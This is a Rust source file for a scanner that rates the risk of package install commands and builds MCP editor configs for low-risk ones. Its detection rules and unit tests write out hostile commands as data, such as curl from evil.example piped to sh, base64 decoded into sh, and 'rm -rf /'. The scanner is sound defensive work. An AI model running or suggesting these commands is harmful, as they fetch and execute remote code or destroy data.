//! Install safety scanner — classifies install command risk and produces safe copy text.

use serde::{Deserialize, Serialize};

/// Output of the install safety scanner.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct InstallSafetyAssessment {
    pub risk_level: String,
    pub reasons: Vec<String>,
    pub requires_secret: bool,
    pub safe_copy_command: Option<String>,
}

/// Assess an install command for safety risk.
pub fn assess_install(
    install_command: Option<&str>,
    npm_package: Option<&str>,
) -> InstallSafetyAssessment {
    let cmd = install_command.map(str::trim).filter(|s| !s.is_empty());

    let Some(cmd) = cmd else {
        return InstallSafetyAssessment {
            risk_level: "medium".into(),
            reasons: vec!["no install command provided".into()],
            requires_secret: false,
            safe_copy_command: None,
        };
    };

    let lower = cmd.to_lowercase();
    let mut reasons: Vec<String> = Vec::new();
    let mut risk_score: i32 = 0;

    if lower.contains("rm -rf") || lower.contains("rm -fr") {
        risk_score = 100;
        reasons.push("destructive rm -rf command".into());
    }

    if lower.contains("base64") && (lower.contains("| sh") || lower.contains("| bash")) {
        risk_score = risk_score.max(100);
        reasons.push("obfuscated base64 piped to shell".into());
    }

    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh") || lower.contains("| bash"))
    {
        risk_score = risk_score.max(80);
        reasons.push("remote script fetched and piped to shell".into());
    }

    if lower.contains("bash -c") || lower.contains("sh -c") {
        risk_score = risk_score.max(75);
        reasons.push("shell -c wrapper executes arbitrary command string".into());
    }

    if lower.contains("> ~/.") || lower.contains(">> ~/.") || lower.contains(">~/") {
        risk_score = risk_score.max(75);
        reasons.push("shell redirection into config files".into());
    }

    if lower.contains("$(") && (lower.contains("curl") || lower.contains("wget")) {
        risk_score = risk_score.max(100);
        reasons.push("command substitution fetching remote code".into());
    }

    let exfil_patterns = [
        ("curl", "secret", "credential exfiltration pattern"),
        ("wget", "token", "credential exfiltration pattern"),
        ("curl", "api_key", "credential exfiltration pattern"),
        ("curl", "password", "credential exfiltration pattern"),
    ];
    for (tool, secret, label) in exfil_patterns {
        if lower.contains(tool) && lower.contains(secret) {
            risk_score = risk_score.max(100);
            reasons.push(label.to_string());
        }
    }

    let requires_secret = lower.contains("api_key")
        || lower.contains("api-key")
        || lower.contains("apikey")
        || lower.contains("secret")
        || lower.contains("token")
        || lower.contains("private_key")
        || lower.contains("private-key")
        || lower.contains("${")
        || lower.contains("$env");

    if requires_secret {
        risk_score = risk_score.max(45);
        reasons.push("requires API key or environment secret".into());
    }

    if lower.contains("npm i -g")
        || lower.contains("npm install -g")
        || lower.contains("pnpm add -g")
        || lower.contains("yarn global")
        || lower.contains("cargo install")
    {
        risk_score = risk_score.max(40);
        reasons.push("global package install".into());
    }

    let is_known_package_manager = lower.starts_with("npm i ")
        || lower.starts_with("npm install ")
        || lower.starts_with("pnpm add ")
        || lower.starts_with("pnpm install ")
        || lower.starts_with("yarn add ")
        || lower.starts_with("npx ")
        || lower.starts_with("cargo install ")
        || lower.starts_with("pip install ");

    if is_known_package_manager && npm_package.is_some() {
        risk_score = risk_score.min(20);
        if reasons.is_empty() {
            reasons.push("documented package manager install".into());
        }
    } else if !is_known_package_manager && risk_score < 50 {
        risk_score = risk_score.max(45);
        reasons.push("unknown or non-package-manager binary command".into());
    }

    let risk_level = if risk_score >= 90 {
        "critical"
    } else if risk_score >= 70 {
        "high"
    } else if risk_score >= 40 {
        "medium"
    } else {
        "low"
    };

    let safe_copy_command = if matches!(risk_level, "low" | "medium") {
        Some(cmd.to_string())
    } else {
        None
    };

    if reasons.is_empty() {
        reasons.push("no elevated risk patterns detected".into());
    }

    InstallSafetyAssessment {
        risk_level: risk_level.to_string(),
        reasons,
        requires_secret,
        safe_copy_command,
    }
}

/// Whether Claude/Cursor JSON config generation should be blocked for this risk level.
pub fn blocks_structured_config(risk_level: &str) -> bool {
    matches!(risk_level, "high" | "critical")
}

/// Human-readable warning for risky install commands.
pub fn install_warning_text(risk_level: &str) -> Option<&'static str> {
    match risk_level {
        "critical" => Some(
            "Install blocked pending operator review. This command contains critical safety risks.",
        ),
        "high" => Some(
            "High-risk install command. Review carefully before running. Structured editor config is not generated for this command.",
        ),
        "medium" => Some(
            "Medium-risk install command. May require secrets or elevated permissions.",
        ),
        _ => None,
    }
}

/// Build a safe Claude Desktop MCP config JSON when the install command is low/medium risk.
///
/// Parses simple `npx package` / `npm exec` patterns into structured command+args.
/// Returns `None` for high/critical risk or unparseable commands.
pub fn claude_mcp_config(server_name: &str, install: &str, risk_level: &str) -> Option<String> {
    if blocks_structured_config(risk_level) || install.trim().is_empty() {
        return None;
    }

    let parts: Vec<&str> = install.split_whitespace().collect();
    if parts.is_empty() {
        return None;
    }

    let (command, args): (&str, Vec<&str>) = match parts[0] {
        "npx" | "npm" | "pnpm" | "yarn" | "cargo" | "pip" | "pip3" | "node" => {
            (parts[0], parts[1..].to_vec())
        }
        _ => return None,
    };

    let args_json: Vec<String> = args.iter().map(|a| format!("\"{a}\"")).collect();
    Some(format!(
        "{{\"mcpServers\":{{\"{server_name}\":{{\"command\":\"{command}\",\"args\":[{}]}}}}}}",
        args_json.join(",")
    ))
}

/// Build Cursor install guidance text (no raw sh -c wrapping).
pub fn cursor_install_note(install: &str, risk_level: &str) -> String {
    if blocks_structured_config(risk_level) {
        "Structured Cursor config is not available for this high-risk install command. \
         Review the generic install command and add manually if you trust the source."
            .to_string()
    } else {
        format!("Add to Cursor MCP settings using the install command:\n{install}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn low_risk_npm_install_with_package() {
        let a = assess_install(Some("npm i @scope/wallet-mcp"), Some("@scope/wallet-mcp"));
        assert_eq!(a.risk_level, "low");
        assert_eq!(
            a.safe_copy_command.as_deref(),
            Some("npm i @scope/wallet-mcp")
        );
    }

    #[test]
    fn low_risk_cargo_install() {
        let a = assess_install(
            Some("cargo install bob-gateway-cli"),
            Some("bob-gateway-cli"),
        );
        assert_eq!(a.risk_level, "low");
        assert!(a.safe_copy_command.is_some());
    }

    #[test]
    fn medium_risk_requires_api_key() {
        let a = assess_install(
            Some("export API_KEY=xxx && npm i @tool/mcp"),
            Some("@tool/mcp"),
        );
        assert_eq!(a.risk_level, "medium");
        assert!(a.requires_secret);
    }

    #[test]
    fn high_risk_curl_pipe_sh() {
        let a = assess_install(Some("curl https://evil.example/install.sh | sh"), None);
        assert_eq!(a.risk_level, "high");
        assert!(a.safe_copy_command.is_none());
        assert!(a
            .reasons
            .iter()
            .any(|r| r.contains("remote script") || r.contains("shell")));
    }

    #[test]
    fn high_risk_sh_c_wrapper() {
        let a = assess_install(Some("sh -c \"npx @foo/mcp\""), None);
        assert_eq!(a.risk_level, "high");
        assert!(blocks_structured_config(&a.risk_level));
    }

    #[test]
    fn critical_rm_rf() {
        let a = assess_install(Some("curl https://x.com/a.sh | sh && rm -rf /"), None);
        assert_eq!(a.risk_level, "critical");
        assert!(a.reasons.iter().any(|r| r.contains("rm -rf")));
    }

    #[test]
    fn critical_base64_obfuscation() {
        let a = assess_install(Some("echo c2g= | base64 -d | sh"), None);
        assert_eq!(a.risk_level, "critical");
        assert!(a.reasons.iter().any(|r| r.contains("base64")));
    }

    #[test]
    fn critical_command_substitution_remote_fetch() {
        let a = assess_install(
            Some("bash -c \"$(curl https://evil.example/run.sh)\""),
            None,
        );
        assert_eq!(a.risk_level, "critical");
    }

    #[test]
    fn empty_install_is_medium() {
        let a = assess_install(None, None);
        assert_eq!(a.risk_level, "medium");
    }

    #[test]
    fn claude_config_generated_for_low_risk_npx() {
        let json = claude_mcp_config("wallet-mcp", "npx @scope/wallet-mcp", "low").unwrap();
        assert!(json.contains("\"command\":\"npx\""));
        assert!(json.contains("@scope/wallet-mcp"));
        assert!(!json.contains("sh"));
        assert!(!json.contains("-c"));
    }

    #[test]
    fn claude_config_blocked_for_high_risk() {
        assert!(claude_mcp_config("tool", "curl https://x.com | sh", "high").is_none());
    }

    #[test]
    fn install_warning_for_critical() {
        assert!(install_warning_text("critical")
            .unwrap()
            .contains("blocked"));
    }
}
